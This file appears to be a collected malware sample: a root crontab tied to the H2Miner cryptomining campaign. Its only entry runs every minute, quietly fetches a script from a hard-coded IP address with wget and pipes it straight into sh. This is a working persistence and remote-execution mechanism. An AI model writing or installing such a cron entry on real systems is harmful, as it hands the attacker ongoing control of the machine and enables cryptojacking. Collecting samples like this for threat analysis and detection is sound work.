# H2Miner/2012/var/spool/cron/crontabs/root
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (- installed on Mon Jan 11 01:50:58 2021)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
* * * * * wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
